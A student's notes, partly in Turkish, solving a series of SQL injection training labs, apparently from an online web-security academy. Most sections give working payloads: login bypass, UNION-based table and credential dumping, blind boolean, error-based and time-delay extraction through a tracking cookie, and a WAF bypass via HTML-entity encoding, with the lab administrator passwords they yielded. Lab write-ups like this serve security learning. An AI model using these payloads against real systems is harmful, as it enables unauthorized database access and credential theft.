#### 1.Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

In this lab w<b>e</b> are si<b>m</b>ply asked to f<b>i</b>nd hidden contents, to do this we simply w<b>r</b>ite 
'OR 1=1 -- in t<b>h</b>e c<b>a</b>tegory filter.


#### 2.Lab: SQL injection vulnerability allowing login bypass

We <b>n</b>eed to log in as administrator in this lab
so we wite administrator to the username space and in the password space we write a ' OR 1=1 --

#### 3.Lab: SQL injection attack, querying the database type and version on Oracle
in the url in the category filter we write the Querry below, there is a Union Based vulnerability so we use that.
' UNION SELECT banner,NULL FROM v$version --

#### 4.Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
In this lab we use the UNION based querry below, in the category filter, we enter null till we find the column number, and because this thing is MySQL I had to add random characters after the comment

' UNION SELECT @@version,NULL -- ASDFDAS

#### 5.Lab: SQL injection attack, listing the database contents on non-Oracle databases

First of all we try entering null to learn how many columns the querry generates, to do that I wrote : ' UNION Select NULL,NULL -- hallo
this meant that the querry returned 2 comluns
then we use the information_schema that holds information about the working of the db, tables, columns etc. to get the names of the tables to find the users_table
with the querry below we get the names of the columns and tables:

' UNION Select Table_name, column_name from information_schema.columns -- hallo

through this we learn that the user table name is 

| Users Table     | users_sjqbuu    |
| --------------- | --------------- |
| password column | password_vbjxeg |
| username column | username_wtupts |
| email column    | email           |
After that we do a querry to get the password for the administrator.

' UNION Select username_wtupts, password_vbjxeg from users_sjqbuu where username_wtupts='administrator' -- hallo

 the querry above returns 

 administrator q4lufxjulfdiihgwz0oz 

| username      | password             |
| ------------- | -------------------- |
| administrator | q4lufxjulfdiihgwz0oz |
than we simply log in with this information

#### 6.Lab: SQL injection attack, listing the database contents on Oracle

For this one we have to do the same thing as the previous one but on an oracle database, which only changes the syntax of the querry.

To determine the number of columns a the table has we write

' UNION SELECT NULL, NULL FROM dual -- 
because oracle doesnt allow you to do a column number check without using a table, so we use a system table named dual to do it.

To find the table names we enter the querry below:

' UNION SELECT table_name FROM all_tables --

After finding the table names we find info about the user table which is ' USERS_ICOBDO '

We write the querry below to get column names:
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_ICOBDO' --

In this case the column names are:
EMAIL
PASSWORD_GOXWED
USERNAME_JXUMQD
 
 aafter this we write:
 ' UNION SELECT PASSWORD_GOXWED, USERNAME_JXUMQD FROM USERS_ICOBDO Where USERNAME_JXUMQD = 'administrator'  --
to find the password which is : m11hon4l823kphi5yykw 
We log in and lab solved.

#### 7.Lab: SQL injection UNION attack, determining the number of columns returned by the query

For this lab we had to find how many columns the table in question has. To do that we simply wrote ' UNION SELECT NULL, NULL,null -- and the lab was solved.

#### 8.Lab: SQL injection UNION attack, finding a column containing text

In this lab we have to find the column with the string data
find the column number:
' UNION Select Null, null, null --

Basılması gereken string ifadeyi sorguda farklı sütunlara denk gelecek şekilde kaydırıyoruz. İkinci sütunun string compatible olduğu ortaya çıkıyor.

' UNION Select null, 'cUaHiD',null from information_schema.tables -- adsffdasss

#### 9.Lab: SQL injection UNION attack, retrieving data from other tables

Kullanıcı infosunu çekip admin olarak giriş yapmamız gerekmektedir bu labda
' UNION select null, null -- asdffdasasdffdasasdfw
the command above helps us determine the number of columns being returned

tablo isimleri bulunur:
' UNION select table_name, null from information_schema.tables -- asdf

users adlı tablo kullanıcı bilgileri içerir.

içeriğini **' UNION select username, password from users -- asdf** komuduyla çekiyoruz

administrator olarak 905n98jzi70fdom4uoxu şifresiyle giriş yapıyoruz.

#### 10.Lab: SQL injection UNION attack, retrieving multiple values in a single column

For this lab, concat kullanarak password and username info will be extracted. Hedef aynı administrator login

labda string destekleyen tek bir sütun var bu yüzden username ve passwordleri tek bir sütunda çıkarıcaz:
' UNION select null,concat(username,' ', password) from users -- adffdassdf
administrator jssdznas6uio45ymlh6f

#### 11.Lab: Blind SQL injection with conditional responses

In this lab we are going to retrieve login info through conditional responses.
in the lab description it says that there is a table named users and that this table has a password and username column. It also states that there is aTrackingID cookie that we can use to perform a blind sql attack. 

Başta password length bulmak için aşağıdaki payload u kullanıyoruz:
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
ben bu işi otomatik olarak yapmak için burp intruder kullandım. 30 deneme girdim, 20nci denemede Welcome back mesajı artık çıkmıyordu bu da password length i belirtiyor

ardından şifreyi bulmak için aşağıdaki payload ı intruder da çalıştıracağız her bir alfanümerik karakter için. bir harf bulduğumuzda da substring konumunu değiştireceğiz.

payload: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

böylece şifre yavaşça çıkıyor
şifre:
hpv2krlq3kioy6aze0y3

#### 12.Lab: Blind SQL injection with conditional errors

Password uzunluğu bulmamıza yarayan querry
'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

Internal server error vermeyi 20 de bırakıyor

Password harflerini tek tek çıkaran querry
Cookie: TrackingId=1tfmSjKBM4BSqBLy'||(SELECT CASE WHEN SUBSTR(password,20,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

her internal srever error da bir karakter bulmuş oluyoruz

iqjcld9aci6sexljtive

| sayi | deger |
| ---- | ----- |
| 1    | i     |
| 2    | q     |
| 3    | j     |
| 4    | c     |
| 5    | l     |
| 6    | d     |
| 7    | 9     |
| 8    | a     |
| 9    | c     |
| 10   | i     |
| 11   | 6     |
| 12   | s     |
| 13   | e     |
| 14   | x     |
| 15   | l     |
| 16   | j     |
| 17   | t     |
| 18   | i     |
| 19   | v     |
| 20   | e     |

#### 13.Lab: Visible error-based SQL injection

Bu labda hatalı bir syntax girdiğimizde hatayı gösteriyor. Biraz zorladığımızda tüm sorguyu bile alabiliyoruz:
`Unterminated string literal started at position 48 in SQL SELECT * FROM tracking WHERE id = 'kale' And -as-'. Expected  char`
![[Pasted image 20250323170231.png]]

burada char beklendiğini görüyoruz. Peki char bekleyen bu sorgudan nasıl yararlanabiliriz? yukarıda gösterildiği gibi invalid bir tip girilince dönülen sorguyu veriyor. Bunu da istediğimiz veriyi int gibi başka bir veri tipine cast ederek yapabiliriz. 

`TrackingId='And 1=cast((select username from users limit 1)as int)--`

yukarıdaki sorguyu yapınca bize aşağıdaki hatayı dönüyor
`ERROR: invalid input syntax for type integer: "administrator"`
bu da ilk sırada administrator olduğunu söylüyor. Diğer sıralardaki verileri sorgulamak için `Limit 1 offset 1` gibi bir ifade yazarak elde edebiliriz. ardından aşağıdaki sorgu ile şifreyi elde ediyoruz:

`TrackingId='And 1=cast((select password from users limit 1)as int)--`

`ERROR: invalid input syntax for type integer: "b9ber907ricbru6ge6op"`

şifre : `b9ber907ricbru6ge6op`

#### 14.Lab: Blind SQL injection with time delays

In this lab we were asked to cause a time delay. So I tried time delay payloads from the sql cheat sheet. I found put that pg_sleep works so it meant that the server is postgre sql.

we simply write `'|| pg_sleep(10) --` tp solve the lab

#### 15.Lab: Blind SQL injection with time delays and information retrieval

Bu labda bizden time delay kullanarak şifre bulmamız isteniyor.
password length bul delay düştüğünde şifre lenght bulundu 20
TrackingId=x'%3BSELECT CASE WHEN (username = 'administrator' And length(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END from users --

intrudera at halletsin
TrackingId=x'%3BSELECT CASE WHEN (username = 'administrator' And substring(password,1,1)='A') THEN pg_sleep(10) ELSE pg_sleep(0) END from users --

şifre: fsmsxiwmnkbzmscpfpcf

16 Pro
17 Pro

Note: Second-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability occurs at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way. For this reason, second-order SQL injection is also known as stored SQL injection.


#### 18.Lab: SQL injection with filter bypass via XML encoding

Stock check özelliği SQL injection zaafiiyeti var. Bunu kullanmak için xml kısmında sql querry yazıyoruz. Ama WAF bizi engelliyor, biz de bunu geçmek için HTML encoding kullannıyoruz.

SQL querry:
3 UNION Select concat(password,' ',username) from users

Encoded querry: 
&#x33;&#x20;&#x55;&#x4E;&#x49;&#x4F;&#x4E;&#x20;&#x53;&#x65;&#x6C;&#x65;&#x63;&#x74;&#x20;&#x63;&#x6F;&#x6E;&#x63;&#x61;&#x74;&#x28;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&#x2C;&#x27;&#x20;&#x27;&#x2C;&#x75;&#x73;&#x65;&#x72;&#x6E;&#x61;&#x6D;&#x65;&#x29;&#x20;&#x66;&#x72;&#x6F;&#x6D;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;&#xA;&#xA;

şifre: r27eewp1b9jxg7kuce6g